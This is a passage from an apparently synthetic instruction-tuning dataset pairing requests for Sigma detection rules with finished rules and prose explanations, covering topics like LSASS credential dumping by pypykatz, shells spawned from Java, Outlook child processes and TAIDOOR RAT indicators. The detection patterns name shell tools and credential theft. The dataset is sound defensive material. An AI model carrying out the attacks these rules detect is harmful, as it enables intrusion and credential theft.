    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: rpc_firewall\n    category: application\n    definition: 'Requirements: install and apply the RPC Firewall to all processes with \"audit:true action:block uuid:df1941c5-fe89-4e79-bf10-463657acf44d or c681d488-d850-11d0-8c52-00c04fd90f7e'\ndetection:\n    selection:\n        EventLog: RPCFW\n        EventID: 3\n        InterfaceUuid:\n            - df1941c5-fe89-4e79-bf10-463657acf44d\n            - c681d488-d850-11d0-8c52-00c04fd90f7e\n    condition: selection\nfalsepositives:\n    - Legitimate usage of remote file encryption\nlevel: high\n",
      "question": "remote RPC calls to possibly abuse remote encryption service via MS-EFSR",
      "answer": "In order to detect remote RPC calls to possibly abuse remote encryption service via MS-EFSR, you should: Monitor the RPC (Remote Procedure Call) firewall logs for applications, specifically looking for Event Log labeled RPCFW with an Event ID of 3. This event indicates an RPC call has been made. Pay special attention to calls made using the Interface UUIDs df1941c5-fe89-4e79-bf10-463657acf44d or c681d488-d850-11d0-8c52-00c04fd90f7e, as these are known identifiers for operations that could be related to the abuse of the Microsoft Encrypting File System Remote (MS-EFSR) service. However, it is important to consider that there may be legitimate usage of remote file encryption services; such activities should not automatically be treated as malicious without further investigation. Since this activity is considered to be of high importance, ensure that the RPC firewall is correctly installed and applied to all relevant processes as a preventative measure against potential abuse."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious process spawning from an Outlook process..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a suspicious process spawning from an Outlook process, you should: observe the creation of processes on Windows systems, particularly focusing on instances where the parent process is Outlook (OUTLOOK.EXE). The types of processes you should be alert for include but are not limited to AppVLP.exe, bash.exe, cmd.exe, cscript.exe, forfiles.exe, hh.exe, mftrace.exe, msbuild.exe, msdt.exe (associated with CVE-2022-30190), mshta.exe, msiexec.exe, powershell.exe, pwsh.exe, regsvr32.exe, schtasks.exe, scrcons.exe, scriptrunner.exe, sh.exe, svchost.exe, wmic.exe, and wscript.exe. Despite rundll32.exe being a common process spawned for malicious purposes, it has been deliberately excluded from this detection due to producing numerous false positives in certain contexts. This monitoring is crucial for identifying potential unauthorized or malicious activities initiated via Outlook, such as the execution of scripts or unauthorized commands that could be indicative of an attack or exploitation attempt. Pay special attention to the command line used to initiate these processes, as it may provide additional context or evidence of malicious intent.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            #- '\\rundll32.exe'\n            #filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #  ParentImage|endswith: '\\OUTLOOK.EXE'\n            #  Image|endswith: '\\rundll32.exe'\n            #  CommandLine|contains: '\\PhotoViewer.dll'\n            #filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #  ParentImage|endswith: '\\OUTLOOK.EXE'\n            #  Image|endswith: '\\rundll32.exe'\n            #  CommandLine|contains|all:\n            #    - 'shell32.dll,Control_RunDLL'\n            #    - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\OUTLOOK.EXE'\n        Image|endswith:\n            - '\\AppVLP.exe'\n            - '\\bash.exe'\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\forfiles.exe'\n            - '\\hh.exe'\n            - '\\mftrace.exe'\n            - '\\msbuild.exe'        # https://github.com/elastic/detection-rules/blob/c76a39796972ecde44cb1da6df47f1b6562c9770/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml\n            - '\\msdt.exe'           # CVE-2022-30190\n            - '\\mshta.exe'\n            - '\\msiexec.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\regsvr32.exe'\n            - '\\schtasks.exe'\n            - '\\scrcons.exe'\n            - '\\scriptrunner.exe'\n            - '\\sh.exe'\n            - '\\svchost.exe'        # https://www.vmray.com/analyses/2d2fa29185ad/report/overview.html\n            - '\\wmic.exe'           # https://app.any.run/tasks/c903e9c8-0350-440c-8688-3881b556b8e0/\n            - '\\wscript.exe'\n            # Several FPs with rundll32.exe\n            # We started excluding specific use cases and ended up commenting out the rundll32.exe sub processes completely\n            #- '\\rundll32.exe'\n            #filter_outlook_photoviewer:  # https://twitter.com/Luke_Hamp/status/1495919717760237568\n            #  ParentImage|endswith: '\\OUTLOOK.EXE'\n            #  Image|endswith: '\\rundll32.exe'\n            #  CommandLine|contains: '\\PhotoViewer.dll'\n            #filter_outlook_printattachments:  # https://twitter.com/KickaKamil/status/1496238278659485696\n            #  ParentImage|endswith: '\\OUTLOOK.EXE'\n            #  Image|endswith: '\\rundll32.exe'\n            #  CommandLine|contains|all:\n            #    - 'shell32.dll,Control_RunDLL'\n            #    - '\\SYSTEM32\\SPOOL\\DRIVERS\\'\n    condition: selection # and not 1 of filter*\nfields:\n    - CommandLine\n    - ParentCommandLine\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious process spawning from an Outlook process.",
      "answer": "In order to detect a suspicious process spawning from an Outlook process, you should: observe the creation of processes on Windows systems, particularly focusing on instances where the parent process is Outlook (OUTLOOK.EXE). The types of processes you should be alert for include but are not limited to AppVLP.exe, bash.exe, cmd.exe, cscript.exe, forfiles.exe, hh.exe, mftrace.exe, msbuild.exe, msdt.exe (associated with CVE-2022-30190), mshta.exe, msiexec.exe, powershell.exe, pwsh.exe, regsvr32.exe, schtasks.exe, scrcons.exe, scriptrunner.exe, sh.exe, svchost.exe, wmic.exe, and wscript.exe. Despite rundll32.exe being a common process spawned for malicious purposes, it has been deliberately excluded from this detection due to producing numerous false positives in certain contexts. This monitoring is crucial for identifying potential unauthorized or malicious activities initiated via Outlook, such as the execution of scripts or unauthorized commands that could be indicative of an attack or exploitation attempt. Pay special attention to the command line used to initiate these processes, as it may provide additional context or evidence of malicious intent."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential DLL sideloading of \"iviewers.dll\" (OLE/COM Object Interface Viewer).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential DLL sideloading of \"iviewers.dll\" (OLE/COM Object Interface Viewer), you should: focus on monitoring Windows image load event logs for instances where the \"iviewers.dll\" library is loaded into a process. Specifically, look for any case where the end part of the loaded image path matches '\\iviewers.dll' indicating that \"iviewers.dll\" was loaded. However, it is essential to exclude any loading instances originating from legitimate paths known to use this DLL for benign purposes, which are typically 'C:\\Program Files (x86)\\Windows Kits\\' and 'C:\\Program Files\\Windows Kits\\'. This method helps in identifying unauthorized or malicious use of \"iviewers.dll\", possibly indicating an attempt at DLL sideloading, while minimizing false positives by disregarding known legitimate usage of this DLL. This approach is critical because DLL sideloading can be exploited by attackers to stealthily execute malicious code under the guise of a legitimate process, making it a tactic often used in sophisticated cyber attacks.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\iviewers.dll'\n    filter:\n        ImageLoaded|startswith:\n            - 'C:\\Program Files (x86)\\Windows Kits\\'\n            - 'C:\\Program Files\\Windows Kits\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: image_load\n    product: windows\ndetection:\n    selection:\n        ImageLoaded|endswith: '\\iviewers.dll'\n    filter:\n        ImageLoaded|startswith:\n            - 'C:\\Program Files (x86)\\Windows Kits\\'\n            - 'C:\\Program Files\\Windows Kits\\'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential DLL sideloading of \"iviewers.dll\" (OLE/COM Object Interface Viewer)",
      "answer": "In order to detect potential DLL sideloading of \"iviewers.dll\" (OLE/COM Object Interface Viewer), you should: focus on monitoring Windows image load event logs for instances where the \"iviewers.dll\" library is loaded into a process. Specifically, look for any case where the end part of the loaded image path matches '\\iviewers.dll' indicating that \"iviewers.dll\" was loaded. However, it is essential to exclude any loading instances originating from legitimate paths known to use this DLL for benign purposes, which are typically 'C:\\Program Files (x86)\\Windows Kits\\' and 'C:\\Program Files\\Windows Kits\\'. This method helps in identifying unauthorized or malicious use of \"iviewers.dll\", possibly indicating an attempt at DLL sideloading, while minimizing false positives by disregarding known legitimate usage of this DLL. This approach is critical because DLL sideloading can be exploited by attackers to stealthily execute malicious code under the guise of a legitimate process, making it a tactic often used in sophisticated cyber attacks."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting activity when a member is added to a security-enabled global group.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect activity when a member is added to a security-enabled global group, you should: observe the security logs from Windows operating systems for specific event identifiers that indicate this activity. Specifically, monitor for the event IDs 4728, which signifies \"A member was added to a security-enabled global group,\" and 632, which also denotes \"Security Enabled Global Group Member Added.\" It is important to understand that these logs are crucial in identifying potential unauthorized or suspicious additions to critical security groups that could indicate a breach or an attempt to gain elevated privileges. Be aware that some detections might not signify malicious activity, hence the low level of confidence in these indicators without further context.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4728 # A member was added to a security-enabled global group\n            - 632 # Security Enabled Global Group Member Added\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4728 # A member was added to a security-enabled global group\n            - 632 # Security Enabled Global Group Member Added\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "activity when a member is added to a security-enabled global group",
      "answer": "In order to detect activity when a member is added to a security-enabled global group, you should: observe the security logs from Windows operating systems for specific event identifiers that indicate this activity. Specifically, monitor for the event IDs 4728, which signifies \"A member was added to a security-enabled global group,\" and 632, which also denotes \"Security Enabled Global Group Member Added.\" It is important to understand that these logs are crucial in identifying potential unauthorized or suspicious additions to critical security groups that could indicate a breach or an attempt to gain elevated privileges. Be aware that some detections might not signify malicious activity, hence the low level of confidence in these indicators without further context."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting Attackers may change the file creation time of a backdoor to make it look like it was installed with the operating system.\nNote that many processes legitimately change the creation time of a file; it does not necessarily indicate malicious activity.\n.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attackers who may change the file creation time of a backdoor to make it look like it was installed with the operating system, you should focus on monitoring for specific changes in files within a Windows environment. Specifically, attention should be given to files within the file_change category, indicating a modification of file metadata, which might suggest nefarious activity when examined within a certain context.\n\nThe primary detection criteria involve scrutinizing the `PreviousCreationUtcTime` attribute of files. If the `PreviousCreationUtcTime` begins with '2022', yet there has not been a corresponding change in `CreationUtcTime` that also starts with '2022', there's a hint of potential tampering akin to what attackers might do to disguise a backdoor. This anomaly could suggest an attempt to alter timestamp data to blend malicious files with legitimate system installations from that period. Similarly, any `PreviousCreationUtcTime` starting with '202' not matching a similar pattern in `CreationUtcTime` indicates a broader scope of this detection strategy, covering the entire decade to catch discrepancies in file creation times.\n\nHowever, not all changes to file creation times are malicious. The explanation specifically accounts for legitimate system processes that could alter file timestamps or create files during their operations. Whitelisted processes include `ProvTool.exe`, `usocoreworker.exe`, and `SystemSettings.exe` located within the Windows System directory, which are known to interact with system configuration and updates legitimately. Additionally, updates stored in `C:\\ProgramData\\USOPrivate\\UpdateStore\\` ending with `.tmp` or `.temp` and changes by `TiWorker.exe` resulting in `.cab` files in Windows directory paths are considered non-malicious and filtered out from alerts to reduce false positives.\n\nFurthermore, it recognizes that changes made to or by the local NTP service are legitimate, indicating an awareness that time synchronization activities might inadvertently trigger criteria that otherwise suggest tampering.\n\nThis detection strategy is classified at a high level of concern due to the sensitivity of the behavior it aims to catch, emphasizing the importance of accurately distinguishing between malicious activity and legitimate system or application functions that could exhibit similar characteristics in logs. Monitoring for these specific patterns of file creation time changes, while excluding known legitimate behaviors, is crucial in identifying potential backdoor installations that attackers have disguised to appear as if they were part of the initial operating system setup.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: file_change\n    product: windows\ndetection:\n    selection1:\n        PreviousCreationUtcTime|startswith: '2022'\n    filter1:\n        CreationUtcTime|startswith: '2022'\n    selection2:\n        PreviousCreationUtcTime|startswith: '202'\n    filter2:\n        CreationUtcTime|startswith: '202'\n    gen_filter_updates:\n        - Image:\n            - 'C:\\Windows\\system32\\ProvTool.exe'\n            - 'C:\\Windows\\System32\\usocoreworker.exe'\n            - 'C:\\Windows\\ImmersiveControlPanel\\SystemSettings.exe'\n        - TargetFilename|startswith: 'C:\\ProgramData\\USOPrivate\\UpdateStore\\'\n        - TargetFilename|endswith:\n            - '.tmp'\n            - '.temp'\n    gen_filter_tiworker:\n        Image|startswith: 'C:\\WINDOWS\\'\n        Image|endswith: '\\TiWorker.exe'\n        TargetFilename|endswith: '.cab'\n    condition: (( selection1 and not filter1 ) or ( selection2 and not filter2 )) and not 1 of gen_filter*\nfalsepositives:\n    - Changes made to or by the local NTP service\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: file_change\n    product: windows\ndetection:\n    selection1:\n        PreviousCreationUtcTime|startswith: '2022'\n    filter1:\n        CreationUtcTime|startswith: '2022'\n    selection2:\n        PreviousCreationUtcTime|startswith: '202'\n    filter2:\n        CreationUtcTime|startswith: '202'\n    gen_filter_updates:\n        - Image:\n            - 'C:\\Windows\\system32\\ProvTool.exe'\n            - 'C:\\Windows\\System32\\usocoreworker.exe'\n            - 'C:\\Windows\\ImmersiveControlPanel\\SystemSettings.exe'\n        - TargetFilename|startswith: 'C:\\ProgramData\\USOPrivate\\UpdateStore\\'\n        - TargetFilename|endswith:\n            - '.tmp'\n            - '.temp'\n    gen_filter_tiworker:\n        Image|startswith: 'C:\\WINDOWS\\'\n        Image|endswith: '\\TiWorker.exe'\n        TargetFilename|endswith: '.cab'\n    condition: (( selection1 and not filter1 ) or ( selection2 and not filter2 )) and not 1 of gen_filter*\nfalsepositives:\n    - Changes made to or by the local NTP service\nlevel: high\n",
      "question": "Attackers may change the file creation time of a backdoor to make it look like it was installed with the operating system.\nNote that many processes legitimately change the creation time of a file; it does not necessarily indicate malicious activity.\n",
      "answer": "In order to detect attackers who may change the file creation time of a backdoor to make it look like it was installed with the operating system, you should focus on monitoring for specific changes in files within a Windows environment. Specifically, attention should be given to files within the file_change category, indicating a modification of file metadata, which might suggest nefarious activity when examined within a certain context.\n\nThe primary detection criteria involve scrutinizing the `PreviousCreationUtcTime` attribute of files. If the `PreviousCreationUtcTime` begins with '2022', yet there has not been a corresponding change in `CreationUtcTime` that also starts with '2022', there's a hint of potential tampering akin to what attackers might do to disguise a backdoor. This anomaly could suggest an attempt to alter timestamp data to blend malicious files with legitimate system installations from that period. Similarly, any `PreviousCreationUtcTime` starting with '202' not matching a similar pattern in `CreationUtcTime` indicates a broader scope of this detection strategy, covering the entire decade to catch discrepancies in file creation times.\n\nHowever, not all changes to file creation times are malicious. The explanation specifically accounts for legitimate system processes that could alter file timestamps or create files during their operations. Whitelisted processes include `ProvTool.exe`, `usocoreworker.exe`, and `SystemSettings.exe` located within the Windows System directory, which are known to interact with system configuration and updates legitimately. Additionally, updates stored in `C:\\ProgramData\\USOPrivate\\UpdateStore\\` ending with `.tmp` or `.temp` and changes by `TiWorker.exe` resulting in `.cab` files in Windows directory paths are considered non-malicious and filtered out from alerts to reduce false positives.\n\nFurthermore, it recognizes that changes made to or by the local NTP service are legitimate, indicating an awareness that time synchronization activities might inadvertently trigger criteria that otherwise suggest tampering.\n\nThis detection strategy is classified at a high level of concern due to the sensitivity of the behavior it aims to catch, emphasizing the importance of accurately distinguishing between malicious activity and legitimate system or application functions that could exhibit similar characteristics in logs. Monitoring for these specific patterns of file creation time changes, while excluding known legitimate behaviors, is crucial in identifying potential backdoor installations that attackers have disguised to appear as if they were part of the initial operating system setup."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting LSASS process access by pypykatz for credential dumping..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect LSASS process access by pypykatz for credential dumping, you should: Monitor process access logs on Windows systems for instances where there is an attempt to access the Local Security Authority Subsystem Service (LSASS) executable. Specifically, look for access attempts to the 'lsass.exe' file. Verify that the access attempts include call traces to 'C:\\Windows\\SYSTEM32\\ntdll.dll+', 'C:\\Windows\\System32\\KERNELBASE.dll+', 'libffi-7.dll', '_ctypes.pyd+', and any 'python3*.dll+' indicating the use of Python, particularly versions 3.6 or newer as required by pypykatz. Additionally, ensure these access attempts request extensive privileges ('0x1FFFFF'), which is indicative of malicious intent such as credential dumping. This activity is classified as critical due to the sensitive nature of the information potentially being compromised.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        CallTrace|contains|all:\n            - 'C:\\Windows\\SYSTEM32\\ntdll.dll+'\n            - 'C:\\Windows\\System32\\KERNELBASE.dll+'\n            - 'libffi-7.dll'\n            - '_ctypes.pyd+'\n            - 'python3*.dll+'   # Pypy requires python>=3.6\n        GrantedAccess: '0x1FFFFF'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_access\n    product: windows\ndetection:\n    selection:\n        TargetImage|endswith: '\\lsass.exe'\n        CallTrace|contains|all:\n            - 'C:\\Windows\\SYSTEM32\\ntdll.dll+'\n            - 'C:\\Windows\\System32\\KERNELBASE.dll+'\n            - 'libffi-7.dll'\n            - '_ctypes.pyd+'\n            - 'python3*.dll+'   # Pypy requires python>=3.6\n        GrantedAccess: '0x1FFFFF'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "LSASS process access by pypykatz for credential dumping.",
      "answer": "In order to detect LSASS process access by pypykatz for credential dumping, you should: Monitor process access logs on Windows systems for instances where there is an attempt to access the Local Security Authority Subsystem Service (LSASS) executable. Specifically, look for access attempts to the 'lsass.exe' file. Verify that the access attempts include call traces to 'C:\\Windows\\SYSTEM32\\ntdll.dll+', 'C:\\Windows\\System32\\KERNELBASE.dll+', 'libffi-7.dll', '_ctypes.pyd+', and any 'python3*.dll+' indicating the use of Python, particularly versions 3.6 or newer as required by pypykatz. Additionally, ensure these access attempts request extensive privileges ('0x1FFFFF'), which is indicative of malicious intent such as credential dumping. This activity is classified as critical due to the sensitive nature of the information potentially being compromised."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting shell spawned from Java host process, which could be a sign of exploitation (e.g. log4j exploitation).\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect shell spawned from Java host process, which could be a sign of exploitation (e.g. log4j exploitation), you should: focus on monitoring the creation of processes on Windows systems. Specifically, look for instances where a Java process (`java.exe`) is the parent process for the creation of command line (`cmd.exe`), PowerShell (`powershell.exe`), or PowerShell Core (`pwsh.exe`) processes. It's important to exclude any activity where the parent or child process's command line includes the term 'build', as this often indicates a legitimate use associated with Continuous Integration (CI) build agents rather than malicious activity. The detection holds a medium severity level, acknowledging that while not all instances of shell spawning from a Java process are malicious, this pattern warrants further investigation due to the potential link to exploitation efforts, like those seen with the log4j vulnerability. Be aware that legitimate uses of system binaries and company-specific internal usages might generate false positive alerts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    filter:\n        ParentImage|contains: 'build'  # excluding CI build agents\n        CommandLine|contains: 'build'  # excluding CI build agents\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\java.exe'\n        Image|endswith:\n            - '\\cmd.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n    filter:\n        ParentImage|contains: 'build'  # excluding CI build agents\n        CommandLine|contains: 'build'  # excluding CI build agents\n    condition: selection and not filter\nfalsepositives:\n    - Legitimate calls to system binaries\n    - Company specific internal usage\nlevel: medium\n",
      "question": "shell spawned from Java host process, which could be a sign of exploitation (e.g. log4j exploitation)",
      "answer": "In order to detect shell spawned from Java host process, which could be a sign of exploitation (e.g. log4j exploitation), you should: focus on monitoring the creation of processes on Windows systems. Specifically, look for instances where a Java process (`java.exe`) is the parent process for the creation of command line (`cmd.exe`), PowerShell (`powershell.exe`), or PowerShell Core (`pwsh.exe`) processes. It's important to exclude any activity where the parent or child process's command line includes the term 'build', as this often indicates a legitimate use associated with Continuous Integration (CI) build agents rather than malicious activity. The detection holds a medium severity level, acknowledging that while not all instances of shell spawning from a Java process are malicious, this pattern warrants further investigation due to the potential link to exploitation efforts, like those seen with the log4j vulnerability. Be aware that legitimate uses of system binaries and company-specific internal usages might generate false positive alerts."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific process characteristics of Chinese TAIDOOR RAT malware load.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect specific process characteristics of Chinese TAIDOOR RAT malware load, you should: Focus on monitoring the process creation logs within Windows environments. Be on the lookout for command line activities that exhibit peculiar patterns indicative of this malware type. Specifically, check for commands that include the patterns 'dll,MyStart' or 'dll MyStart'. Additionally, pay attention to scenarios where the command line ends with ' MyStart' in conjunction with the presence of 'rundll32.exe'. These specific command line characteristics are strong indicators of an attempt to load the TAIDOOR RAT malware. Be aware that there might be cases where these patterns do not signify a malicious activity, but such instances are unknown. Due to the high impact and risk associated with this malware, this detection carries a high priority level.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'dll,MyStart'\n            - 'dll MyStart'\n    selection2a:\n        CommandLine|endswith: ' MyStart'\n    selection2b:\n        CommandLine|contains: 'rundll32.exe'\n    condition: selection1 or ( selection2a and selection2b )\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection1:\n        CommandLine|contains:\n            - 'dll,MyStart'\n            - 'dll MyStart'\n    selection2a:\n        CommandLine|endswith: ' MyStart'\n    selection2b:\n        CommandLine|contains: 'rundll32.exe'\n    condition: selection1 or ( selection2a and selection2b )\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "specific process characteristics of Chinese TAIDOOR RAT malware load",
      "answer": "In order to detect specific process characteristics of Chinese TAIDOOR RAT malware load, you should: Focus on monitoring the process creation logs within Windows environments. Be on the lookout for command line activities that exhibit peculiar patterns indicative of this malware type. Specifically, check for commands that include the patterns 'dll,MyStart' or 'dll MyStart'. Additionally, pay attention to scenarios where the command line ends with ' MyStart' in conjunction with the presence of 'rundll32.exe'. These specific command line characteristics are strong indicators of an attempt to load the TAIDOOR RAT malware. Be aware that there might be cases where these patterns do not signify a malicious activity, but such instances are unknown. Due to the high impact and risk associated with this malware, this detection carries a high priority level."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting potential suspicious winget package installation from a suspicious source..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect potential suspicious winget package installation from a suspicious source, you should monitor the creation of stream hash logs on Windows systems. Specifically, look for entries where the content begins with '[ZoneTransfer] ZoneId=3', indicating a file downloaded from the Internet. Furthermore, scrutinize any content that contains URLs with a single digit following the '://', which might be indicative of an untrusted source. It's also crucial to pay attention to target filenames ending with ':Zone.Identifier' and containing the path '\\AppData\\Local\\Temp\\WinGet\\', as these are hallmarks of files associated with winget package installations. The condition for detecting suspicious activity rests on these specific criteria being met. While there are possibilities for false positives, given the nature of these indicators, the level of concern is classified as high, underscoring the importance of vigilance for such patterns to mitigate potential threats.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: create_stream_hash\ndetection:\n    selection:\n        Contents|startswith: '[ZoneTransfer]  ZoneId=3'\n        Contents|contains:\n            # Note: Add any untrusted sources that are custom to your env\n            - '://1'\n            - '://2'\n            - '://3'\n            - '://4'\n            - '://5'\n            - '://6'\n            - '://7'\n            - '://8'\n            - '://9'\n        TargetFilename|endswith: ':Zone.Identifier'\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\WinGet\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: create_stream_hash\ndetection:\n    selection:\n        Contents|startswith: '[ZoneTransfer]  ZoneId=3'\n        Contents|contains:\n            # Note: Add any untrusted sources that are custom to your env\n            - '://1'\n            - '://2'\n            - '://3'\n            - '://4'\n            - '://5'\n            - '://6'\n            - '://7'\n            - '://8'\n            - '://9'\n        TargetFilename|endswith: ':Zone.Identifier'\n        TargetFilename|contains: '\\AppData\\Local\\Temp\\WinGet\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "potential suspicious winget package installation from a suspicious source.",
      "answer": "In order to detect potential suspicious winget package installation from a suspicious source, you should monitor the creation of stream hash logs on Windows systems. Specifically, look for entries where the content begins with '[ZoneTransfer] ZoneId=3', indicating a file downloaded from the Internet. Furthermore, scrutinize any content that contains URLs with a single digit following the '://', which might be indicative of an untrusted source. It's also crucial to pay attention to target filenames ending with ':Zone.Identifier' and containing the path '\\AppData\\Local\\Temp\\WinGet\\', as these are hallmarks of files associated with winget package installations. The condition for detecting suspicious activity rests on these specific criteria being met. While there are possibilities for false positives, given the nature of these indicators, the level of concern is classified as high, underscoring the importance of vigilance for such patterns to mitigate potential threats."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect changes to the ClickOnce trust prompt registry key in order to enable an installation from different locations such as the Internet, you should monitor Windows Registry settings specifically for \"SetValue\" events. Focus on changes made under the `\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\` path with particular attention to any modifications ending with '\\Internet', '\\LocalIntranet', '\\MyComputer', '\\TrustedSites', or '\\UntrustedSites'. The critical detail to look for is the 'Enabled' status in these registry settings. These changes might signal an attempt to lower security measures and facilitate installations from less secure or trusted locations. However, be aware that some legitimate internal requirements might necessitate such modifications, leading to possible false positives. The severity of this detection is considered medium, emphasizing its importance without suggesting it signals an immediate and critical threat. Understanding these modifications can play a crucial role in identifying potential security risks associated with the weakening of ClickOnce trust prompts.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: registry_set\n    product: windows\ndetection:\n    selection:\n        EventType: SetValue\n        TargetObject|contains: '\\SOFTWARE\\MICROSOFT\\.NETFramework\\Security\\TrustManager\\PromptingLevel\\'\n        TargetObject|endswith:\n            - '\\Internet'\n            - '\\LocalIntranet'\n            - '\\MyComputer'\n            - '\\TrustedSites'\n            - '\\UntrustedSites'\n        Details: 'Enabled'\n    condition: selection\nfalsepositives:\n    - Legitimate internal requirements.\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
